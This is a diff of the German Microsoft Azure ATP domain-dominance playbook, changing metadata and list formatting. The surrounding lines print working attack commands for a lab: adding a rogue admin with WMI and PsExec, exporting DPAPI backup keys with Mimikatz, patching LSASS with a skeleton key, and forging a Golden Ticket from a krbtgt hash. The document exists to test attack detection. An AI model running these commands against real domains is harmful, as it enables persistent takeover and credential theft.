@@ -2,17 +2,17 @@
 title: Playbook zur Azure ATP-Domänendominanz
 description: Das Azure ATP-Domänendominanzplaybook beschreibt, wie Sie Domänendominanzangriffe für die Erkennung durch Azure ATP simulieren
 ms.service: azure-advanced-threat-protection
-ms.topic: tutorial
+ms.topic: how-to
 author: shsagir
 ms.author: shsagir
 ms.date: 02/28/2019
 ms.reviewer: itargoet
-ms.openlocfilehash: b5903123e992f7540dd660da605a1568bf76ef91
-ms.sourcegitcommit: 63be53de5b84eabdeb8c006438dab45bd35a4ab7
+ms.openlocfilehash: 10266136b495c6fcc04355c8a16ca1c0ea00381c
+ms.sourcegitcommit: 2be59f0bd4c9fd0d3827e9312ba20aa8eb43c6b5
 ms.translationtype: HT
 ms.contentlocale: de-DE
-ms.lasthandoff: 04/21/2020
-ms.locfileid: "79414589"
+ms.lasthandoff: 08/27/2020
+ms.locfileid: "88953744"
 ---
 # <a name="tutorial-domain-dominance-playbook"></a>Tutorial: Playbook zu Domänendominanz
 
@@ -57,19 +57,19 @@ Versuchen Sie, mithilfe von WMI über die Befehlszeile einen Prozess lokal auf d
    wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
    ```
 
-2. Fügen Sie jetzt den erstellten Benutzer der Gruppe „Administrators“ auf dem Domänencontroller hinzu:
+1. Fügen Sie jetzt den erstellten Benutzer der Gruppe „Administrators“ auf dem Domänencontroller hinzu:
 
    ``` cmd
    PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
    ```
 
-   ![Verwenden der Codeausführung von Remotestandorten (PsExec), um der Administratorgruppe auf dem Domänencontroller den neuen Benutzer hinzuzufügen](media/playbook-dominance-psexec_addtoadmins.png)
+    ![Verwenden der Codeausführung von Remotestandorten (PsExec), um der Administratorgruppe auf dem Domänencontroller den neuen Benutzer hinzuzufügen](media/playbook-dominance-psexec_addtoadmins.png)
 
-3. Wechseln Sie zu **Active Directory-Benutzer und -Computer (ADUC)** auf **ContosoDC**, und suchen Sie den **InsertedUser**. 
+1. Wechseln Sie zu **Active Directory-Benutzer und -Computer (ADUC)** auf **ContosoDC**, und suchen Sie den **InsertedUser**. 
 
-4. Klicken Sie mit der rechten Maustaste auf **Eigenschaften**, und überprüfen Sie die Mitgliedschaft.
+1. Klicken Sie mit der rechten Maustaste auf **Eigenschaften**, und überprüfen Sie die Mitgliedschaft.
 
-   ![Anzeigen der Eigenschaften von „InsertedUser“](media/playbook-dominance-inserteduser_properties.png)
+    ![Anzeigen der Eigenschaften von „InsertedUser“](media/playbook-dominance-inserteduser_properties.png)
 
 Als Angreifer haben Sie in Ihrer Testumgebung erfolgreich mithilfe von WMI einen neuen Benutzer erstellt. Sie haben auch mithilfe von PsExec den neuen Benutzer der Gruppe „Administrators“ hinzugefügt. Aus der Perspektive der Persistenz wurde eine weitere berechtigte, unabhängige Anmeldeinformation auf dem Domänencontroller erstellt. Neue Anmeldeinformationen bieten einem Angreifer permanenten Zugriff auf den Domänencontroller für den Fall, dass die vorherigen Anmeldeinformationen erkannt und entfernt wurden.
 
@@ -103,9 +103,9 @@ Mithilfe von **Mimikatz** versuchen wir, den Hauptschlüssel vom Domänencontrol
    mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
    ```
 
-   ![Verwendung von Mimikatz zum Exportieren des DPAPI-Sicherungsschlüssels aus Active Directory](media/playbook-dominance-dpapi_mimikatz.png)
+    ![Verwendung von Mimikatz zum Exportieren des DPAPI-Sicherungsschlüssels aus Active Directory](media/playbook-dominance-dpapi_mimikatz.png)
 
-2. Überprüfen Sie, ob die Hauptschlüsseldatei exportiert wurde. Informieren Sie sich über die erstellten DER-, PFX-, PVK- und KEY-Dateien in dem Verzeichnis, in dem Sie „mimikatz.exe“ ausgeführt haben. Kopieren Sie den veralteten Schlüssel aus der Befehlszeile.
+1. Überprüfen Sie, ob die Hauptschlüsseldatei exportiert wurde. Informieren Sie sich über die erstellten DER-, PFX-, PVK- und KEY-Dateien in dem Verzeichnis, in dem Sie „mimikatz.exe“ ausgeführt haben. Kopieren Sie den veralteten Schlüssel aus der Befehlszeile.
 
 Als Angreifer verfügen wir jetzt über den Schlüssel zum Entschlüsseln aller DPAPI-verschlüsselten Dateien / sensiblen Daten aus *allen* Computern in der Gesamtstruktur.
 
@@ -151,15 +151,15 @@ Wir verwenden einen Skeleton Key, um zu sehen, wie diese Art von Angriff funktio
    xcopy mimikatz.exe \\ContosoDC\c$\temp
    ```
 
-2. Da **mimikatz** nun auf dem DC bereitgestellt ist, führen Sie das Programm über PsExec remote aus:
+1. Da **mimikatz** nun auf dem DC bereitgestellt ist, führen Sie das Programm über PsExec remote aus:
 
    ``` cmd
    PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
    ```
 
-3. Sie haben den LSASS-Prozess erfolgreich auf **ContosoDC** gepatcht.
+1. Sie haben den LSASS-Prozess erfolgreich auf **ContosoDC** gepatcht.
 
-   ![Skeleton Key-Angriff über mimikatz](media/playbook-dominance-skeletonkey.png)
+    ![Skeleton Key-Angriff über mimikatz](media/playbook-dominance-skeletonkey.png)
 
 ### <a name="exploiting-the-skeleton-key-patched-lsass"></a>Ausnutzen des mit Skeleton Key gepatchten LSASS
 
@@ -202,25 +202,25 @@ Nach dem Diebstahl des „Golden Ticket“ („krbtgt“-Konto, erläutert [hier
    whoami /user
    ```
 
-   ![SID für Golden Ticket-Benutzer](media/playbook-dominance-golden_whoamisid.png)
+    ![SID für Golden Ticket-Benutzer](media/playbook-dominance-golden_whoamisid.png)
 
-2. Identifizieren und kopieren Sie die im obigen Screenshot hervorgehobene Domänen-SID.
+1. Identifizieren und kopieren Sie die im obigen Screenshot hervorgehobene Domänen-SID.
 
-3. Verwenden Sie mithilfe von **mimikatz** die kopierte Domänen-SID zusammen mit dem gestohlenen NTLM-Hash des „krbtgt“-Benutzers zum Generieren des TGT. Fügen Sie den folgenden Text als JeffL in eine „cmd.exe“-Datei ein:
+1. Verwenden Sie mithilfe von **mimikatz** die kopierte Domänen-SID zusammen mit dem gestohlenen NTLM-Hash des „krbtgt“-Benutzers zum Generieren des TGT. Fügen Sie den folgenden Text als JeffL in eine „cmd.exe“-Datei ein:
 
    ``` cmd
    mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
    ```
 
-   ![Generieren des Golden Ticket](media/playbook-dominance-golden_generate.png)
+    ![Generieren des Golden Ticket](media/playbook-dominance-golden_generate.png)
 
    Der ```/ptt```-Teil des Befehls ermöglichte uns, das generierte Ticket sofort dem Arbeitsspeicher zu übergeben.
 
-4. Stellen Sie sicher, dass die Anmeldeinformationen sich im Arbeitsspeicher befinden.  Führen Sie ```klist``` in der Konsole aus.
+1. Stellen Sie sicher, dass die Anmeldeinformationen sich im Arbeitsspeicher befinden.  Führen Sie ```klist``` in der Konsole aus.
 
-   ![Klist-Ergebnisse nach dem Übergeben des generierten Tickets](media/playbook-dominance-golden_klist.png)
+    ![Klist-Ergebnisse nach dem Übergeben des generierten Tickets](media/playbook-dominance-golden_klist.png)
 
-5. Führen Sie als Angreifer den folgenden Pass-the-Ticket-Befehl gegen den DC aus:
+1. Führen Sie als Angreifer den folgenden Pass-the-Ticket-Befehl gegen den DC aus:
 
    ``` cmd
    dir \\ContosoDC\c$
@@ -228,7 +228,7 @@ Nach dem Diebstahl des „Golden Ticket“ („krbtgt“-Konto, erläutert [hier
 
    Erfolgreich! Sie haben ein **gefälschtes** Golden Ticket für SamiraA generiert.
 
-   ![Ausführen des Golden Ticket über Mimikatz](media/playbook-dominance-golden_ptt.png)
+    ![Ausführen des Golden Ticket über Mimikatz](media/playbook-dominance-golden_ptt.png)
 
 Warum hat es funktioniert? Der Golden Ticket-Angriff funktioniert, da das generierte Ticket ordnungsgemäß mit dem Schlüssel „KRBTGT“ signiert wurde, den wir zuvor gestohlen haben. Dieses Ticket ermöglicht uns, als Angreifer Zugriff auf ContosoDC zu erlangen und uns einer Sicherheitsgruppe hinzuzufügen, die wir verwenden möchten.
 
@@ -239,7 +239,7 @@ Azure ATP verwendet mehrere Methoden, um vermutete Angriffe dieses Typs zu erken
 ![Golden Ticket wird erkannt](media/playbook-dominance-golden_detected.png)
 
 > [!Important]
->Erinnerung. Solange das von einem Angreifer gestohlene KRBTGT in einer Umgebung gültig ist, bleiben die damit generierten Tickets auch gültig. In diesem Fall erreicht der Angreifer permanente Domänendominanz, bis [KRBTGT zweimal zurückgesetzt wird](https://docs.microsoft.com/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).
+>Erinnerung. Solange das von einem Angreifer gestohlene KRBTGT in einer Umgebung gültig ist, bleiben die damit generierten Tickets auch gültig. In diesem Fall erreicht der Angreifer permanente Domänendominanz, bis [KRBTGT zweimal zurückgesetzt wird](/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).
 
 ## <a name="next-steps"></a>Nächste Schritte
 
